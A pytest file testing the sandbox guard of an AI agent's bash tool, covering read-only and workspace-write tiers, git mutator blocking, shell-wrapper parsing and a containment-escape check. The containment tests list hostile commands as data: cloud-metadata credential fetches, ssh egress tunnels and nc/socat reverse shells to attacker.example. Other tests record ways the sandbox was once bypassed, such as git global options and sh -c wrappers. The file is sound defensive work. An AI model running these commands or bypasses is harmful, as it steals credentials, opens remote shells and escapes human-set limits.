"""Tests for the bash tool sandbox (rant 2026-08-20T15:46:50).

Covers the static file-level isolation check: three tiers
(danger-full-access / read-only / workspace-write), protected daemon state
files, honest enforcement reporting (full/partial), and blocked-result
feedback through execute().
"""

import asyncio
import os
import tempfile

import pytest

from emrg.tools.bash_tool import (
    BashTool,
    SANDBOX_MODES,
    _check_sandbox,
    _extract_write_targets,
    _GIT_READ_VERBS,
    _GIT_SHAPE_DECIDED,
    check_workspace_write,
)


def _run(coro):
    return asyncio.run(coro)


# ── constant ──────────────────────────────────────────────────────────────

def test_sandbox_modes_constant():
    assert SANDBOX_MODES == ("danger-full-access", "read-only", "workspace-write")


# ── _extract_write_targets ────────────────────────────────────────────────

def test_extract_rm_rf_target():
    assert _extract_write_targets("rm -rf /tmp/x") == ["/tmp/x"]
    assert _extract_write_targets("rm -r ./build") == ["./build"]
    assert _extract_write_targets("rm -rf /tmp/a; echo hi") == ["/tmp/a"]


def test_extract_rmdir_target():
    assert _extract_write_targets("rmdir /tmp/empty") == ["/tmp/empty"]


def test_extract_mv_destination():
    assert _extract_write_targets("mv /tmp/a /tmp/b") == ["/tmp/b"]


def test_extract_cp_r_destination():
    assert _extract_write_targets("cp -r src /tmp/dst") == ["/tmp/dst"]
    assert _extract_write_targets("cp -R ./a ./b") == ["./b"]


def test_extract_redirect_targets():
    assert _extract_write_targets("echo x > /tmp/y") == ["/tmp/y"]
    assert _extract_write_targets("echo x >> /tmp/y") == ["/tmp/y"]
    assert _extract_write_targets("cmd 2> err.txt") == ["err.txt"]
    assert _extract_write_targets("echo x > /dev/null") == ["/dev/null"]
    # 2>&1 is not a file redirect — must not be captured
    assert "&1" not in _extract_write_targets("echo x > /tmp/y 2>&1")


def test_extract_no_targets_for_plain_reads():
    assert _extract_write_targets("ls -la") == []
    assert _extract_write_targets("git status") == []
    assert _extract_write_targets("echo hello") == []


# ── _check_sandbox — danger-full-access ───────────────────────────────────

def test_check_danger_full_access_always_allowed():
    allowed, reason, enforcement = _check_sandbox("rm -rf /", "danger-full-access")
    assert allowed is True
    assert reason is None
    assert enforcement == "full"


def test_check_invalid_mode_blocked():
    allowed, reason, enforcement = _check_sandbox("echo hi", "sandboxed")
    assert allowed is False
    assert "invalid sandbox mode" in reason
    assert enforcement == "partial"


# ── _check_sandbox — read-only ────────────────────────────────────────────

def test_check_read_only_blocks_destructive_commands():
    for cmd in ("rm -rf /tmp/x", "rmdir /tmp/empty", "mv /tmp/a /tmp/b",
                "cp -r src /tmp/dst"):
        allowed, reason, enforcement = _check_sandbox(cmd, "read-only")
        assert allowed is False, cmd
        assert "read-only sandbox" in reason
        assert enforcement == "partial"


def test_check_read_only_blocks_redirects():
    allowed, _, _ = _check_sandbox("echo x > /tmp/y", "read-only")
    assert allowed is False
    allowed, _, _ = _check_sandbox("echo x >> /tmp/y", "read-only")
    assert allowed is False


def test_check_read_only_allows_dev_null_redirect():
    allowed, _, _ = _check_sandbox("echo hi > /dev/null", "read-only")
    assert allowed is True


def test_check_read_only_allows_read_commands():
    for cmd in ("ls -la", "git status", "cat file.txt", "pwd", "echo hi",
                "git stash list", "git stash show -p",
                "git stash show stash@{0}", "git stash list | grep foo",
                "git worktree list", "git worktree list --porcelain",
                "git submodule status", "git submodule status | head"):
        allowed, _, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, cmd


def test_check_read_only_blocks_git_mutators():
    """Community issue #979: read-only must block git mutating commands —
    the 2026-08-20 data-loss killers (stash / checkout . / reset --hard /
    clean) escaped the rm/mv/cp target scan. Under read-only they must be
    structurally impossible, not merely discouraged by a prompt rule."""
    for cmd in (
        "git stash",
        "git stash list && git stash drop",
        "git stash push -m wip",
        "git stash drop stash@{0}",
        "git stash pop",
        "git stash clear",
        "git checkout .",
        "git checkout -- src/main.py",
        "git restore .",
        "git clean -fd",
        "git reset --hard",
        "git reset --mixed HEAD~1",
        "git commit -m 'wip'",
        "git push origin master",
        "git pull --rebase",
        "git merge master",
        "git rebase master",
        "git cherry-pick abc123",
        "git revert abc123",
        "git rm foo.py",
        "git switch feature/x",
        "git branch -d old",
        "git branch -D old",
        "git tag -d v1",
        # working-tree writers (cycle 20260825-193548)
        "git apply patch.diff",
        "git am patch-series.mbox",
        "git archive --output=tree.tar HEAD",
        "git submodule update --init",
        "git worktree add ../wt master",
        # worktree/submodule MUTATORS stay blocked (cycle 20260825-200038)
        "git worktree remove ../wt",
        "git worktree move ../wt ../wt2",
        "git worktree prune",
        "git worktree lock ../wt",
        "git worktree unlock ../wt",
        "git submodule add https://example.com/repo.git sub",
        "git submodule deinit -f .",
        "git submodule sync",
        "git worktree list && git worktree remove ../wt",
        "git submodule status; git submodule update",
    ):
        allowed, reason, enforcement = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} should be blocked"
        assert "read-only sandbox" in reason, cmd
        # Either the git-verb guard or the write-target scan may fire first
        # (`git rm foo.py` now names the removed path, not the verb) — both
        # are legitimate blocks; what must hold is that it *is* blocked.
        assert "git" in reason or "destructive write" in reason, cmd
        assert enforcement == "partial"


def test_check_read_only_blocks_git_mv():
    """`git mv a b` is blocked by the write-target scan (mv destination) —
    the git-mutator reason isn't required, the block is what matters."""
    allowed, reason, _ = _check_sandbox("git mv a b", "read-only")
    assert allowed is False
    assert "read-only sandbox" in reason


def test_check_read_only_allows_git_reads():
    """Read-only keeps read-only git reads available — the read-only cycle
    still needs status/fetch/log/diff for scanning and review."""
    for cmd in (
        "git status --short --branch",
        "git fetch origin master",
        "git log --oneline -3",
        "git diff",
        "git diff --cached",
        "git show HEAD --stat",
        "git branch -a",
        "git remote -v",
        "git rev-parse --abbrev-ref HEAD",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} should be allowed (got {reason!r})"


def test_check_workspace_write_allows_git_mutators():
    """workspace-write is the normal working tier — tasks must still be able
    to commit/push there. Only read-only blocks git mutation."""
    for cmd in ("git stash", "git checkout .", "git reset --hard",
                "git commit -m x", "git push origin master"):
        allowed, _, _ = _check_sandbox(cmd, "workspace-write")
        assert allowed is True, cmd


# ── _check_sandbox — workspace-write ──────────────────────────────────────

def test_check_workspace_write_allows_relative_writes():
    # Relative targets are assumed in-workspace (cwd = workspace root).
    allowed, _, _ = _check_sandbox("echo x > out.txt", "workspace-write")
    assert allowed is True
    allowed, _, _ = _check_sandbox("rm -rf ./build", "workspace-write")
    assert allowed is True


def test_check_workspace_write_allows_temp_and_workspace_abs():
    allowed, _, _ = _check_sandbox(f"echo x > {tempfile.gettempdir()}/y", "workspace-write")
    assert allowed is True
    allowed, _, _ = _check_sandbox(
        "echo x > /workspace/out.txt", "workspace-write", workdir="/workspace"
    )
    assert allowed is True


def test_check_workspace_write_blocks_protected_daemon_file():
    allowed, reason, enforcement = _check_sandbox(
        "echo x > ~/.emrg/config.toml", "workspace-write"
    )
    assert allowed is False
    assert "protected" in reason
    assert enforcement == "partial"


def test_check_workspace_write_blocks_emrg_home_rm():
    allowed, reason, _ = _check_sandbox("rm -rf ~/.emrg", "workspace-write")
    assert allowed is False
    assert "daemon's data directory" in reason


def test_check_workspace_write_blocks_outside_workspace():
    allowed, _, _ = _check_sandbox(
        "rm -rf /etc/hosts", "workspace-write", workdir="/workspace"
    )
    assert allowed is False
    allowed, _, _ = _check_sandbox(
        "echo x > /etc/hosts", "workspace-write", workdir="/workspace"
    )
    assert allowed is False


# ── workspace-write trusted zone (issue #1093 self-regression) ─────────────
# PR #1092 added check_workspace_write to write/edit (mirroring bash) and
# blocked absolute targets outside the injected workspace. The evolution task
# runs at workspace-write with workspace = the repo checkout, but writes its
# own cycle records to ~/.emrg/evolution/.emrg/memory/* — which is OUTSIDE that
# workspace. That was a self-regression (the evolution module couldn't record
# its own history). The fix trusts ~/.emrg/evolution/.emrg as a write zone and
# normalizes the OS-temp root for the Temp\<suffix> discrepancy. Both positive
# and negative states must be verified.


def test_workspace_write_allows_evolution_memory(monkeypatch, tmp_path):
    """write/edit/bash may target ~/.emrg/evolution/.emrg/memory (the evolution
    module's own data root) even though it is outside the repo workspace."""
    import emrg.tools.bash_tool as bt
    # Pin the user home + evolution data root so the test is hermetic and does
    # not depend on this host's real ~/.emrg layout.
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    # Recompute the trusted zone against the pinned HOME.
    evo_data = os.path.realpath(os.path.expanduser("~/.emrg/evolution/.emrg"))
    ws = str(tmp_path / "ws")
    # check_workspace_write (write/edit tools)
    meta = evo_data + "/memory/cycle-20260901-000000.md"
    assert check_workspace_write(meta, ws) is None
    # bash _check_sandbox (redirect to memory index)
    allowed, reason, _ = _check_sandbox(
        f"echo x > {evo_data}/memory/MEMORY.md", "workspace-write", ws
    )
    assert allowed is True, f"should allow evolution memory write (got {reason!r})"


def test_workspace_write_allows_evolution_session_scratch(monkeypatch, tmp_path):
    """The trusted evolution-data zone covers session scratch (sessions/) too,
    per the _trusted_write_zones() docstring — lock it in so a future narrowing
    of the zone to memory/ alone cannot silently break session writes."""
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    evo_data = os.path.realpath(os.path.expanduser("~/.emrg/evolution/.emrg"))
    ws = str(tmp_path / "ws")
    # check_workspace_write (write/edit tools)
    session = evo_data + "/sessions/emrg-evolution-emrg-task/history.jsonl"
    assert check_workspace_write(session, ws) is None
    # bash _check_sandbox (redirect to a session scratch file)
    allowed, reason, _ = _check_sandbox(
        f"echo x > {evo_data}/sessions/emrg-evolution-emrg-task/notes.txt",
        "workspace-write", ws,
    )
    assert allowed is True, f"should allow evolution session-scratch write (got {reason!r})"


def test_workspace_write_still_blocks_emrg_home(monkeypatch, tmp_path):
    """Even with the trusted evolution-data zone, ~/.emrg itself is still
    blocked from destructive write (the guard is not widened)."""
    check = check_workspace_write("~/.emrg", str(tmp_path / "ws"))
    assert check is not None
    assert "daemon's data directory" in check
    allowed, reason, _ = _check_sandbox("rm -rf ~/.emrg", "workspace-write", str(tmp_path / "ws"))
    assert allowed is False
    assert "daemon's data directory" in reason


def test_workspace_write_still_blocks_protected_file():
    """Protected daemon state files remain blocked regardless of the trusted
    evolution-data zone."""
    check = check_workspace_write("~/.emrg/config.toml", "/workspace")
    assert check is not None
    assert "protected daemon file" in check


def test_workspace_write_temp_root_normalized(monkeypatch):
    r"""Temp\<suffix> discrepancy (Windows): when gettempdir() returns a
    Temp\<suffix> path, the parent Temp root is also allowed so helpers written
    to the plain Temp root are not blocked."""
    import tempfile as _tf
    import emrg.tools.bash_tool as bt
    fake_suffix = "/fake/Temp/2"
    fake_parent = "/fake/Temp"
    monkeypatch.setattr(_tf, "gettempdir", lambda: fake_suffix)
    # _temp_write_roots must include both the suffix path and the parent Temp root.
    roots = bt._temp_write_roots()
    assert any(r == os.path.realpath(fake_suffix) for r in roots)
    assert any(r == os.path.realpath(fake_parent) for r in roots)
    # A write to the parent Temp root is not blocked.
    check = check_workspace_write("/fake/Temp/emrg_probe.py", "/workspace")
    assert check is None


# ── execute() integration ─────────────────────────────────────────────────

def test_execute_read_only_blocks_rm_rf():
    tool = BashTool()
    result = _run(tool.execute({
        "command": "rm -rf /tmp/emrg-sandbox-test",
        "sandbox": "read-only",
    }))
    assert result.error is True
    assert "sandbox" in result.content
    assert "not executed" in result.content


def test_execute_workspace_write_blocks_protected_file():
    tool = BashTool()
    result = _run(tool.execute({
        "command": "echo x > ~/.emrg/config.toml",
        "sandbox": "workspace-write",
    }))
    assert result.error is True
    assert "sandbox" in result.content


def test_execute_sandboxed_success_tags_output():
    tool = BashTool()
    result = _run(tool.execute({
        "command": "echo hi",
        "sandbox": "workspace-write",
    }))
    assert not result.error
    assert "[sandbox:workspace-write enforcement=partial] ok" in result.content
    assert "hi" in result.content


def test_execute_danger_full_access_unchanged():
    tool = BashTool()
    result = _run(tool.execute({"command": "echo hello", "sandbox": "danger-full-access"}))
    assert not result.error
    assert "hello" in result.content
    assert "sandbox" not in result.content


def test_execute_no_sandbox_key_unchanged():
    """Default (no sandbox key) = danger-full-access = current behavior."""
    tool = BashTool()
    result = _run(tool.execute({"command": "echo hello"}))
    assert not result.error
    assert "hello" in result.content
    assert "sandbox" not in result.content


# ── containment-escape guard (issue #1102) ─────────────────────────────────
# Borrowed from Claude Code v2.1.257 ("Containment Escape"): block cloud
# metadata-credential fetches and egress tunnels under the checked tiers.
# A metadata fetch is a READ — the write-target scan cannot catch it, so the
# destination-based check must run on both read-only and workspace-write.

def test_containment_blocks_metadata_endpoints():
    """Cloud metadata endpoints (IMDSv1/v2, ECS, GCP) are never legitimate in
    development commands — blocked under both checked tiers."""
    for cmd in (
        "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "curl http://169.254.169.254/latest/meta-data/ && echo hi",
        "curl http://169.254.170.2/v2/credentials/",
        "curl http://169.254.169.123/computeMetadata/v1/",
        "curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "curl 'http://[fd00:ec2::254]/latest/meta-data/'",
        "wget -q -O- http://169.254.169.254/latest/meta-data/",
    ):
        for mode in ("read-only", "workspace-write"):
            allowed, reason, enforcement = _check_sandbox(cmd, mode)
            assert allowed is False, f"{cmd!r} @ {mode}"
            assert "containment-escape" in reason, f"{cmd!r} @ {mode}"
            assert "cloud-metadata endpoint" in reason, f"{cmd!r} @ {mode}"
            assert enforcement == "partial"


def test_containment_blocks_ssh_egress_tunnels():
    """ssh remote/dynamic forwards are the classic egress tunnels — blocked.
    The issue's example: `ssh -R 1080:169.254.169.254:80 user@attacker`."""
    for cmd in (
        "ssh -R 1080:169.254.169.254:80 user@attacker.example",
        "ssh -NR 1080:localhost:80 user@host",
        "ssh user@host -D 1080",
        "ssh -D 1080 user@host",
        "ssh -o 'RemoteForward=1080:localhost:80' user@host",
        "ssh -o DynamicForward=1080 user@host",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "workspace-write")
        assert allowed is False, f"{cmd!r}"
        assert "containment-escape" in reason, f"{cmd!r}"


def test_containment_blocks_backdoor_markers():
    """nc -e / ncat --exec / socat EXEC:/SYSTEM: are backdoor shells; the
    IMDSv2 token header marks a credential fetch."""
    for cmd in (
        "nc -e /bin/sh attacker.example 4444",
        "ncat --exec /bin/sh attacker.example 4444",
        "nc -l -e /bin/sh",
        "socat TCP:attacker.example:4444 EXEC:/bin/sh",
        "socat TCP-LISTEN:4444,fork EXEC:/bin/sh",
        "socat SYSTEM:/bin/sh TCP:attacker.example:4444",
        "curl -s -H 'X-aws-ec2-metadata-token: abc123' http://169.254.169.254/latest/meta-data/",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "workspace-write")
        assert allowed is False, f"{cmd!r}"
        assert "containment-escape" in reason, f"{cmd!r}"


def test_containment_allows_legitimate_commands():
    """False-positive guards: common dev/ops commands that merely resemble
    the escape vectors must stay allowed."""
    for cmd in (
        # normal network reads
        "curl -s https://api.github.com/repos/argszero/emrg",
        "curl -s -o /tmp/out.json https://example.com/data",
        "wget https://example.com/file.tar.gz",
        "ping 8.8.8.8",
        "git fetch origin master",
        # ssh local port-forward is the common dev tunnel (not an egress vector)
        "ssh -L 5432:db.internal:5432 bastion",
        "ssh -L 8080:localhost:3000 user@host",
        # ssh remote command with -R/-D inside quotes is NOT a tunnel
        "ssh host 'grep -R pattern /var/log'",
        'ssh host "ls -la"',
        # ssh compound binaries (-R has a different meaning there)
        "ssh-add -R example.com",
        "ssh-keygen -R example.com",
        # curl -e is the --referer flag, not an exec marker
        "curl -s -e https://referrer.example https://api.example.com",
        # nc without -e is a plain port probe/listener
        "nc -l 1234",
        "nc -vz host 80",
        # socat without EXEC/SYSTEM is a dev pipe tool
        "socat -d -d TCP-LISTEN:8080,fork STDOUT",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "workspace-write")
        assert allowed is True, f"{cmd!r} should be allowed (got {reason!r})"
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} should be allowed under read-only (got {reason!r})"


def test_containment_allows_git_push_under_workspace_write():
    """git push is a workspace-write normal action (only read-only blocks git
    mutators) — the containment guard must not interfere with it."""
    allowed, reason, _ = _check_sandbox("git push origin master", "workspace-write")
    assert allowed is True, f"git push should be allowed (got {reason!r})"


def test_containment_reason_names_escape_vector():
    """The block reason names the exact escape vector so the caller can
    surface it — no silent pass."""
    allowed, reason, _ = _check_sandbox(
        "curl http://169.254.169.254/latest/meta-data/", "workspace-write"
    )
    assert allowed is False
    assert "cloud-metadata endpoint" in reason
    assert "169.254.169.254" in reason
    allowed, reason, _ = _check_sandbox(
        "ssh -R 1080:localhost:80 user@host", "workspace-write"
    )
    assert allowed is False
    assert "ssh egress tunnel" in reason


def test_execute_containment_blocks_curl_metadata():
    """execute() integration: a metadata fetch is blocked under
    workspace-write with the ⛔ sandbox banner."""
    tool = BashTool()
    result = _run(tool.execute({
        "command": "curl http://169.254.169.254/latest/meta-data/",
        "sandbox": "workspace-write",
    }))
    assert result.error is True
    assert "sandbox" in result.content
    assert "containment-escape" in result.content
    assert "not executed" in result.content


def test_execute_danger_tier_warns_but_runs():
    """danger-full-access opts into no blocking, but a containment-escape
    command still gets a visible warning in the tool result. (The command is
    an echo of the vector — the guard scans command text, not network.)"""
    tool = BashTool()
    result = _run(tool.execute({
        "command": "echo 'curl http://169.254.169.254/latest/meta-data/'",
        "sandbox": "danger-full-access",
    }))
    assert not result.error
    assert "containment-escape" in result.content
    assert "executed anyway" in result.content


# ── write-target parsing (issue #1162) ────────────────────────────────────
#
# The extractor used to regex-scan raw text, which was wrong in BOTH
# directions and the two failures had one cause: it could not tell a `>`
# that was an operator from one inside an argument. These tests pin both
# sides, and then pin the invariant itself rather than the verb list.

def test_quoted_redirect_is_not_a_write_target():
    """Issue #1162: a `>` inside a quoted argument is data, not an operator.

    Measured on master: every one of these was BLOCKED under read-only, with
    reasons like `targeting 'b"'` and `targeting '0)"'`. One of them cost a
    real cycle a retry — a `gh issue create` whose *title* contained `>`.
    """
    for cmd in (
        'echo "a > b"',
        'grep -n "x > y" file.txt',
        'python3 -c "print(1 > 0)"',
        'git log --oneline --grep="a > b"',
        'gh issue create --title "fix a > b comparison" --body-file /tmp/x.md',
        'echo "IGNORED -> writing here leaves porcelain clean"',
    ):
        assert _extract_write_targets(cmd) == [], cmd
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} must be allowed (got {reason!r})"


def test_real_redirects_are_still_write_targets():
    """The positive control: dropping quoted ones must not drop real ones."""
    assert _extract_write_targets("echo x > /tmp/y") == ["/tmp/y"]
    assert _extract_write_targets("echo x >> /tmp/y") == ["/tmp/y"]
    assert _extract_write_targets("cmd 2> err.txt") == ["err.txt"]
    assert _extract_write_targets("cmd &> out.txt") == ["out.txt"]
    for cmd in ("echo x > /tmp/y", "echo x >> /tmp/y", "cmd 2> err.txt"):
        allowed, _, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, cmd


def test_non_recursive_and_unlisted_writers_are_destructive():
    """Issue #1162: one verb, two spellings, opposite verdicts.

    `rm` was destructive only when a recursive flag was present, so
    `rm a.txt` deleted a file the same guard refused to let `rm -rf dir`
    touch. The listed-writers gap is the same defect one step further out.
    """
    for cmd, target in (
        ("rm a.txt", "a.txt"),
        ("rm -f a.txt", "a.txt"),
        ("cp b.txt a.txt", "a.txt"),
        ("truncate -s 0 a.txt", "a.txt"),
        ("tee a.txt", "a.txt"),
    ):
        assert target in _extract_write_targets(cmd), cmd
        allowed, _, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} deletes/overwrites and must be blocked"


def test_sed_in_place_is_blocked_but_a_filter_is_not():
    """`sed -i` rewrites its file arguments; a bare `sed` only writes stdout.

    The flag can carry a suffix (`-i.bak`), so the decision is on the flag
    prefix rather than an exact match.
    """
    for cmd in ("sed -i '' 's/x/y/' a.txt", "sed -i.bak 's/x/y/' a.txt"):
        allowed, _, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, cmd
    for cmd in ("sed 's/x/y/' a.txt", "sed -n 1p a.txt"):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} is a filter and must be allowed ({reason!r})"


def test_chain_separators_stop_the_argument_scan():
    """A chain's later command is not an argument of the earlier one."""
    assert _extract_write_targets("rm -rf /tmp/x; echo hi") == ["/tmp/x"]
    assert _extract_write_targets("echo hi && rm x.txt") == ["x.txt"]
    allowed, _, _ = _check_sandbox("ls -la && git status", "read-only")
    assert allowed is True


def test_write_guard_preserves_the_tree_it_promises_not_to_touch(tmp_path):
    """The invariant, not the verb list (issue #1162's own suggestion).

    Run each representative mutator in a scratch repo under its DECIDED
    verdict and assert the tree is unchanged. A list-based test can only be
    as complete as the list; this fails loudly when a spelling slips through
    — which is exactly how `rm a.txt` and `sed -i` went unnoticed.
    """
    import subprocess as sp

    repo = tmp_path / "scratch"
    repo.mkdir()
    (repo / "a.txt").write_text("original\n", encoding="utf-8")
    (repo / "b.txt").write_text("other\n", encoding="utf-8")
    sp.run(["git", "init", "-q"], cwd=repo, check=True)
    sp.run(["git", "add", "-A"], cwd=repo, check=True)
    sp.run(["git", "-c", "user.email=e@x", "-c", "user.name=t", "commit", "-qm", "init"],
           cwd=repo, check=True)
    (repo / "a.txt").write_text("uncommitted edit\n", encoding="utf-8")
    before = sp.run(["git", "status", "--porcelain"], cwd=repo,
                    capture_output=True, text=True, encoding="utf-8").stdout

    for cmd in ("rm a.txt", "rm -f a.txt", "cp b.txt a.txt", "truncate -s 0 a.txt",
                "tee a.txt", "sed -i '' 's/original/x/' a.txt"):
        allowed, _, _ = _check_sandbox(cmd, "read-only", str(repo))
        assert allowed is False, f"{cmd!r} must be blocked under read-only"
        # The guard is static, so a block means the command never ran. Assert
        # the file is intact rather than assuming it.
        assert (repo / "a.txt").read_text(encoding="utf-8") == "uncommitted edit\n", cmd

    after = sp.run(["git", "status", "--porcelain"], cwd=repo,
                   capture_output=True, text=True, encoding="utf-8").stdout
    assert after == before


def test_option_values_are_not_mistaken_for_file_operands():
    """Argument filtering must skip the *value* an option consumes.

    Dropping every token that starts with ``-`` is not enough: in
    ``truncate -s 0 a.txt`` the first non-flag token is the size ``0``, so a
    naive filter reports ``0`` as the file to be written. That still blocks —
    but it names a token that is not a path, and a guard whose message points
    at the wrong thing is one nobody can act on. The operands are what the
    message must name.
    """
    targets = _extract_write_targets("truncate -s 0 a.txt")
    assert targets == ["a.txt"], targets
    # Same shape via the verbose spelling, and for a file whose name could be
    # confused with a value.
    assert _extract_write_targets("truncate --size 12 report.txt") == ["report.txt"]
    assert _extract_write_targets("tee -a log.txt") == ["log.txt"]
    # `sed`'s first operand is the script, not a file to rewrite.
    assert _extract_write_targets("sed -i s/a/b/ f.txt") == ["f.txt"]


def test_find_delete_is_a_destructive_write_but_a_plain_find_is_not():
    """`find ... -delete` removes matches; `find` alone only prints them.

    Issue #1162 listed `find . -name "*.pyc" -delete` among the destructive
    writes that read-only allowed. The guard must separate the two: blocking
    every `find` would refuse an ordinary read, which is the over-block
    failure this change exists to remove.
    """
    for cmd in ('find . -name "*.pyc" -delete', "find build -type f -delete"):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, cmd
        assert "destructive write" in reason, reason
    for cmd in ("find . -name '*.pyc'", "find . -name '*.pyc' -print", "find . -type d"):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} is a read and must be allowed ({reason!r})"

# ── git mutator / shell-wrapper regression guards (from #1167) ──────────
#
# PR #1167's own guards. They are branch-only relative to master (master has
# the write-target guards from #1168 instead), and the two sets are disjoint
# — neither side's tests cover the other's feature. Kept whole rather than
# side-picked: taking either side silently drops a class of coverage.

def test_check_read_only_allows_shell_c_without_a_mutator():
    """Recursing into a wrapper must not block the wrapper itself — the
    payload is judged, and a read inside `sh -c` stays a read."""
    for cmd in (
        "sh -c 'git status'",
        "sh -c 'git log --oneline'",
        "bash -c 'echo hello'",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} must be allowed (got {reason!r})"

def test_check_read_only_blocks_chained_mutator_under_a_prefix():
    """A prefixed chain must block: the old scan fell through to `return True`.

    When the prefix made the regex miss, `m` was None, so the exemption check
    and the anti-chain logic never ran at all — `git -C . stash list && git -C
    . stash drop` was ALLOWED. The bare chained form already blocked, so only
    the prefixed one catches this.
    """
    for cmd in (
        "git -C . stash list && git -C . stash drop",
        "git -C . stash show -p && git -C . stash pop",
        "git --no-pager stash list; git --no-pager stash clear",
        "git -c x=1 worktree list && git -c x=1 worktree remove ../wt",
        "git status && git -C . checkout .",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked"
        assert "git" in reason, cmd

def test_check_read_only_blocks_git_mutators_with_global_options():
    """Community issue #1156: a git global option must not defeat the guard.

    The old raw-text scan required the subcommand immediately after `git\\s+`,
    so a global option sat exactly where it expected the verb: 7 mutators × 4
    spellings were ALL allowed while every bare form blocked. Generated rather
    than hand-listed because the point is the cross product — the suite missed
    this by covering 41 cases, all bare forms.
    """
    mutators = (
        "stash", "checkout .", "checkout -- uv.lock", "restore uv.lock",
        "reset --hard", "clean -fd", "commit -am x", "push origin master",
        "merge master", "rebase master", "cherry-pick abc123", "rm foo.py",
        "switch feature/x", "apply patch.diff", "am series.mbox",
        "submodule update --init", "worktree add ../wt master",
    )
    prefixes = ("", "-C . ", "-c x=1 ", "--work-tree=. ",
                "--git-dir=/var/tmp/x ", "--no-pager ")
    for verb in mutators:
        for prefix in prefixes:
            cmd = f"git {prefix}{verb}"
            allowed, reason, _ = _check_sandbox(cmd, "read-only")
            assert allowed is False, (
                f"{cmd!r} must be blocked (global option defeats the scan?)"
            )
            # Two layers can legitimately catch this: the git-verb classifier
            # (`git commit -am x` writes no file target) or the write-target
            # scan (`git rm foo.py` names an operand). Asserting *which* layer
            # fired couples this test to the order of the checks, so it passed
            # on this branch and failed once the write-target parser (#1168)
            # landed — the same command, the same safe outcome, a different
            # reason string. The invariant is "blocked with a sandbox reason".
            assert "sandbox" in reason, cmd

def test_check_read_only_blocks_mutator_inside_shell_c_wrapper():
    """A mutator the shell will *run* is blocked however it is written.

    `sh -c 'git checkout .'` tokenises as the command `sh` plus one opaque
    string, so a guard that only classifies the outer tokens sees no git
    invocation at all. The pre-parsing regex scanned the whole line and
    blocked these; parsing must not trade that away. Measured 2026-09-12
    against master: all five of these were blocked before the parse rewrite
    and became writable under read-only after it, so they are regression
    guards, not new features.
    """
    for cmd in (
        "sh -c 'git checkout .'",
        'bash -c "git reset --hard"',
        "zsh -c 'git clean -fd'",
        "dash -c 'git stash'",
        "eval 'git checkout .'",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked"
        assert "git" in reason, cmd

def test_check_read_only_blocks_nested_mutator_under_a_chain():
    """Nesting and chaining compose: the wrapper's payload is its own command
    line, so a chained mutator inside it must still be found."""
    for cmd in (
        "sh -c 'cd /x; git read-tree -u --reset HEAD'",
        "sh -c 'git status && git stash drop'",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked"
        assert "git" in reason, cmd

def test_check_read_only_blocks_nested_wrapper_spelled_with_a_path():
    """`/bin/sh -c '...'` is the same wrapper as `sh -c '...'`."""
    allowed, reason, _ = _check_sandbox("/bin/sh -c 'git checkout .'", "read-only")
    assert allowed is False
    assert "git" in reason

def test_check_read_only_blocks_unlisted_plumbing_mutators():
    """Community issue #1159: verbs that were never on the list.

    `git read-tree -u --reset HEAD` overwrites the working tree and destroys
    uncommitted work — measured on a scratch repo, exiting 0 and silently — but
    it was not in the alternation (`--reset` is a substring, not the verb). The
    others rewrite refs/objects/history and are the same class of damage. A
    list-based guard cannot be fixed by adding one more word: the decision is
    the *verb*, so these must be decidable without anyone remembering them.
    """
    for cmd in (
        "git read-tree -u --reset HEAD",
        "git read-tree -m -u HEAD",
        "git update-ref refs/heads/x HEAD",
        "git update-index --assume-unchanged a.txt",
        "git symbolic-ref HEAD refs/heads/x",
        "git reflog expire --expire=now --all",
        "git gc --prune=now",
        "git repack -a -d",
        "git filter-branch --force",
        "git pack-refs --all",
        "git replace abc123 def456",
        "git add -A",
        "git remote set-url origin https://example.com/x.git",
        "git config core.hooksPath /tmp/hooks",
        "git config user.name someone",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked"
        assert "git" in reason, cmd

def test_check_read_only_blocks_windows_spelled_git():
    """`git.exe` is the name the command actually has on Windows, so the
    extension and directory forms name the same program as `git`."""
    for cmd in ("git.exe checkout .", "/usr/local/bin/git.exe reset --hard"):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked"
        assert "git" in reason, cmd

def test_check_read_only_does_not_block_mentions_or_near_misses():
    """The other direction: parsing must stop the raw-text over-block.

    `git merge-base A B` is a read that the old scan refused as if it were
    `git merge`. Guarded because a fix for the under-block that simply allows
    arbitrary tokens before the verb would start blocking real reads.
    """
    for cmd in (
        "git merge-base A B",
        "git stash list", "git stash show -p", "git stash list | grep foo",
        "git worktree list", "git worktree list --porcelain",
        "git submodule status", "git branch -a", "git tag -l",
        "git remote -v", "git config -l", "git config --get user.name",
        "git status --porcelain", "git log --oneline -3", "git show HEAD --stat",
        "git diff", "git diff --cached", "git rev-parse --abbrev-ref HEAD",
        "git fetch origin master",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} must stay allowed (got {reason!r})"

